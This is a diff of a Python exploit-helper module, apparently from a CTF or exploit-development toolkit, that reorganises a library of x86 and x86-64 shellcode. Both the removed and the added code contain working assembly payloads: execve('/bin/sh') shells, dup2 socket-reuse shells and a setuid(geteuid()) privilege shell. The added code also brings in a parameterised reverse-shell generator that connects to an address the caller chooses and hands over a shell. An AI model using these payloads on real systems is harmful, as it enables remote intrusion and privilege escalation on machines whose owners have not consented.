@@ -123,52 +123,6 @@ class x86:
   @staticmethod
   def disas(code, **kw):
     capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_32, **kw)
-  class shellcode:
-    shell = """
-      xor eax, eax
-      push eax
-      push 0x68732f2f
-      push 0x6e69622f
-      mov ebx, esp
-      push eax
-      push ebx
-      mov ecx, esp
-      mov al, 0xb
-      int 0x80
-      """
-    shell_sock_reuse = """
-      push 2
-      pop ebx
-      push 0x29
-      pop eax
-      int 0x80
-      dec eax
-      ; here we filled eax with dup(2) -> prefix is optional
-
-      mov esi, eax
-
-      ; dup2's
-      xor ecx, ecx
-      push esi
-      pop ebx
-    duploop:
-      push 0x3f
-      pop eax
-      int 0x80
-      inc ecx
-      cmp cl, 3
-      jne duploop
-      """ + shell
-    # setuid(geteuid()); system("/bin/sh")
-    shell_euid = """
-      xor eax, eax
-      mov al, 0x46
-      xor ebx, ebx
-      mov bx, 0x1fa
-      xor ecx, ecx
-      mov cx, 0x1fa
-      int 0x80
-      """ + shell
 
 class x86_64:
   @staticmethod
@@ -177,28 +131,107 @@ class x86_64:
   @staticmethod
   def disas(code, **kw):
     capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_64, **kw)
-  class shellcode:
-    shell = """
-      xor rdi, rdi
-      push rdi
-      push rdi
-      pop rsi
-      pop rdx
-      mov rdi, 0x68732f6e69622f2f
-      shr rdi, 8
-      push rdi
-      push rsp
-      pop rdi
-      push 0x3b
-      pop rax
-      syscall
-      """
 
-for c in [x86, x86_64]:
-  for k, v in c.shellcode.__dict__.items():
-    sc = c.assemble(v)
-    c.shellcode.__dict__[k] = sc
+class x86_shellcode:
+  shell = x86.assemble(""" ; execve("/bin//sh", 0, 0);
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    xor ecx, ecx
+    xor edx, edx
+    mov al, 0xb
+    int 0x80
+    """)
+  dup2_ebx = x86.assemble(""" ; dup2(ebx, 2); dup2(ebx, 1); dup2(ebx, 0)
+    ; assume that socket fd is in ebx
+    push 0x2
+    pop ecx  ;set loop-counter
+  ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
+  duploop:
+    mov al, 0x3f ;syscall: sys_dup2
+    int 0x80     ;exec sys_dup2
+    dec ecx	     ;decrement loop-counter
+    jns duploop     ;as long as SF is not set -> jmp to loop
+  """)
+  shell_sock_reuse = x86.assemble(""" ; ebx = dup(2) - 1; dup2_ebx; shell
+    push 2
+    pop ebx
+    push 0x29
+    pop eax
+    int 0x80
+    dec eax
+    mov ebx, eax
+    """) + dup2_ebx + shell
+  # setuid(geteuid()); system("/bin/sh")
+  shell_euid = x86.assemble(""" ; setuid(geteuid()); shell
+    xor eax, eax
+    mov al, 0x46
+    xor ebx, ebx
+    mov bx, 0x1fa
+    xor ecx, ecx
+    mov cx, 0x1fa
+    int 0x80
+    """) + shell
+  @staticmethod
+  def shell_reverse(addr, port):
+    addr = "0x" + "".join("%02x" % int(x) for x in reversed(addr.split(".")))
+    port = "0x%02x%02x" % (port&0xff, port>>8)
+    sc = x86.assemble("""
+      ; socket
+      push 0x66
+      pop eax ;syscall: sys_socketcall + cleanup eax
+      push 0x1
+      pop ebx ;sys_socket (0x1) + cleanup ebx
+      xor edx,edx ;cleanup edx
+      push edx ;protocol=IPPROTO_IP (0x0)
+      push ebx ;socket_type=SOCK_STREAM (0x1)
+      push 0x2 ;socket_family=AF_INET (0x2)
+      mov ecx, esp ;save pointer to socket() args
+      int 0x80 ;exec sys_socket
+      xchg edx, eax; save result (sockfd) for later usage
+      ; connect
+      mov al, 0x66
+      push {addr}  ;sin_addr=127.1.1.1 (network byte order)
+      push word {port} ;sin_port=1337 (network byte order)
+      inc ebx
+      push word bx     ;sin_family=AF_INET (0x2)
+      mov ecx, esp     ;save pointer to sockaddr struct
+      push 0x10 ;addrlen=16
+      push ecx  ;pointer to sockaddr
+      push edx  ;sockfd
+      mov ecx, esp ;save pointer to sockaddr_in struct
+      inc ebx ; sys_connect (0x3)
+      int 0x80 ;exec sys_connect
+      xchg ebx,edx ;save sockfd
+      """.format(addr=addr, port=port))
     assert contains_not(sc, "\0")
+    return sc + x86_shellcode.dup2_ebx + x86_shellcode.shell
+
+class x86_64_shellcode:
+  shell = x86_64.assemble("""
+    xor rdi, rdi
+    push rdi
+    push rdi
+    pop rsi
+    pop rdx
+    mov rdi, 0x68732f6e69622f2f
+    shr rdi, 8
+    push rdi
+    push rsp
+    pop rdi
+    push 0x3b
+    pop rax
+    syscall
+    """)
+
+for c in [x86_shellcode, x86_64_shellcode]:
+  for k, sc in c.__dict__.items():
+    if not k.startswith('_') and isinstance(sc, str):
+      assert contains_not(sc, "\0")
 
 def alloc_exec_buffer(buf):
   libc = ctypes.CDLL('libc.so.6')
